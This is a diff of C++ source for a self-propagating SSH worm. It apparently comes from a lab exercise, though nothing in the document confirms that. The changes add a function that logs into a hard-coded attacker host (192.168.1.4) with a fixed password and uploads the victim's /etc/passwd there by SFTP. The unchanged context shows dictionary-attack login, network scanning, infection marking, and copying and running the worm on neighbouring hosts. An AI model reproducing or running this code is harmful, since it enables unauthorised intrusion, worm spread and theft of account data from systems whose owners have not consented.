@@ -17,6 +17,13 @@
 #include <fcntl.h>
 #include<vector>
 #include<map>
+#include <string.h> /* for strncpy */
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/ioctl.h>
+#include <netinet/in.h>
+#include <net/if.h>
+#include <arpa/inet.h>
 #define MAX_XFER_BUF_SIZE 16384
  
  
@@ -100,61 +107,131 @@ std::vector<std::string> getHostsOnSameNetwork() {
         return res;
     }
 }
+
+/*Gets IP Address of Current Machine
+Reference: http://stackoverflow.com/questions/2283494/get-ip-address-of-an-interface-on-linux
+*/
+char* getMyIP() {
+
+	int fd;
+	struct ifreq ifr;
+
+	fd = socket(AF_INET, SOCK_DGRAM, 0);
+
+	/* I want to get an IPv4 IP address */
+	ifr.ifr_addr.sa_family = AF_INET;
+
+	/* I want IP address attached to "eth0" */
+	strncpy(ifr.ifr_name, "eth0", IFNAMSIZ - 1);
+
+	ioctl(fd, SIOCGIFADDR, &ifr);
+
+	close(fd);
+
+	/* display result */
+	printf("%s\n", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
+
+	return inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
+}
+
+
+int connectToAttacker(ssh_session session) {
+
+	int rc;
+	ssh_options_set(session, SSH_OPTIONS_HOST, "192.168.1.4");
+
+	rc = ssh_connect(session);
+
+	if (rc == SSH_OK) {
+
+		if (ssh_write_knownhost(session) < 0) {
+			fprintf(stderr, "Error %s", strerror(errno));
+			return 0;
+		}
+		else {
+			rc = ssh_userauth_password(session, NULL, "123456");
+			if (rc == SSH_AUTH_SUCCESS) {
+				printf("\nLogin Success");
+				return 1;
+			}
+			if (rc != SSH_AUTH_SUCCESS) {
+				printf("\n Error Authenticating");
+				return 0;
+			}
+
+		}
+	}
+	else {
+		fprintf(stderr, "\nError Connecting to localhost: %s\n", ssh_get_error(session));
+		return 0;
+	}
+	
+}
  
-/*Need to change this function*/
+/*Copies password file from Victim system to attacker system
+Input: 
+1. ssh Session
+2. IP address of Host
+Output:
+1 - Successful Copy
+0 - Error while copy
+*/
  
 int copyPasswordFile(ssh_session session, std::string host) {
-    int access_type;
+    int access_type = O_WRONLY | O_CREAT | O_TRUNC;
     sftp_file file;
     char buffer[MAX_XFER_BUF_SIZE];
     int nbytes, nwritten, rc;
     int fd;
     sftp_session sftp;
+printf("In copy password functiopn");
+		sftp = sftp_new(session);
+		if (sftp == NULL)
+		{
+			fprintf(stderr, "\nError allocating SFTP session: %s\n",
+			ssh_get_error(session));
+			return 0;
+		}
+		rc = sftp_init(sftp);
+		if (rc != SSH_OK)
+		{
+			sftp_free(sftp);
+			return 0;
+		}
+		std::string newFilePath = "/tmp/passwd_" + host;
+	printf("%s", newFilePath.c_str());
+		file = sftp_open(sftp, newFilePath.c_str(),access_type, S_IRWXU);
+		if (file == NULL)
+		{
+			fprintf(stderr, "\nCan't open remote file for writing: %s\n",
+			ssh_get_error(session));
+			return 0;
+		}
+
+		std::ifstream fin("/etc/passwd", std::ios::binary);
+		if (fin) {
+			fin.seekg(0, std::ios::end);
+			std::ios::pos_type length = fin.tellg(); // get file size in bytes
+			fin.seekg(0); // rewind to beginning of file
+
+			char* replicatorFile = new char[length];
+			fin.read(replicatorFile, length); // read file contents into buffer
+
+			sftp_write(file, replicatorFile, length); // write to remote file
+		}
+		else {
+			return 0;
+		}
+
+		rc = sftp_close(file);
+		if (rc != SSH_OK)
+		{
+			fprintf(stderr, "\nCan't close the written file: %s\n", ssh_get_error(session));
+			return 0;
+		}
+		printf("\nCopy Successfull !");
+		return 1;
  
-    sftp = sftp_new(session);
-    access_type = O_RDONLY;
-    file = sftp_open(sftp, "/etc/passwd",
-        access_type, 0);
-    if (file == NULL) {
-        fprintf(stderr, "Can't open file for reading: %s\n",
-            ssh_get_error(session));
-        return SSH_ERROR;
-    }
-    std::string newFilePath = "/tmp/passwd_" + host; 
-   
-    fd = open(newFilePath.c_str(), O_CREAT|O_WRONLY, 0777);
-    if (fd < 0) {
-        fprintf(stderr, "Can't open file for writing: %s\n",
-            strerror(errno));
-        return SSH_ERROR;
-    }
-    for (;;) {
-        nbytes = sftp_read(file, buffer, sizeof(buffer));
-        if (nbytes == 0) {
-            break; // EOF
-        }
-        else if (nbytes < 0) {
-            fprintf(stderr, "Error while reading file: %s\n",
-                ssh_get_error(session));
-            sftp_close(file);
-            return SSH_ERROR;
-        }
-        nwritten = write(fd, buffer, nbytes);
-	printf("nwritten: %d, nbytes: %d", nwritten, nbytes);
-        if (nwritten != nbytes) {
-            fprintf(stderr, "Error writing: %s\n",
-                strerror(errno));
-            sftp_close(file);
-            return SSH_ERROR;
-        }
-    }
-    rc = sftp_close(file);
-    if (rc != SSH_OK) {
-        fprintf(stderr, "Can't close the read file: %s\n",
-            ssh_get_error(session));
-        return rc;
-    }
-    return SSH_OK;
 }
  
 /*Copies the executable of this worm  to remote system
@@ -182,7 +259,7 @@ int copyFile(ssh_session session) {
     if (rc != SSH_OK)
     {
         sftp_free(sftp);
-        return 0
+		return 0;
     }
  
     file = sftp_open(sftp, "/tmp/passwordW",
@@ -327,15 +404,32 @@ int main() {
     ssh_channel channel;
     int res;
     std::map<std::string, std::string> dictAttackList;
+    std::string myIP = getMyIP();
 	/*Call to initialize Dictionary*/
     initializeDict(dictAttackList);
 
 	/*Call to mark the system as Infected*/
     markInfected();
 
+	my_ssh_session = ssh_new();
+	if (my_ssh_session == NULL)
+		exit(-1);
+
+	if (strcmp(myIP.c_str(), "192.168.1.4") != 0) {
+	printf("IP is differert");
+		if(connectToAttacker(my_ssh_session) == 1){
+			
+			printf("gong to coppy password file");
+			copyPasswordFile(my_ssh_session, myIP.c_str());
+		}
+		ssh_disconnect(my_ssh_session);
+		ssh_free(my_ssh_session);
+	}
+
+
 	/*Call to fetch Hosts in the Network*/
     std::vector<std::string> hosts = getHostsOnSameNetwork();
- 
+	
 	/*Iterating through the hosts to connect and infect the system*/
     for (std::vector<std::string>::iterator host = hosts.begin(); host != hosts.end(); ++host) {
         std::cout << "\n Host: " << *host;
@@ -348,8 +442,8 @@ int main() {
             printf("\nSucceded to get into the host");
  
             if (!isInfected(my_ssh_session)) {
-		copyPasswordFile(my_ssh_session, *host);
                 res = executeFile(my_ssh_session);
+		sleep(5);
                 if (res) {
                     std::cout << "\n Infected. " << *host << ". I can rest now ;)\n";
                     break;
@@ -358,5 +452,7 @@ int main() {
         }
 		else
 			printf("Error occured in connection");
+			ssh_disconnect(my_ssh_session);
+			ssh_free(my_ssh_session);
     }
 }
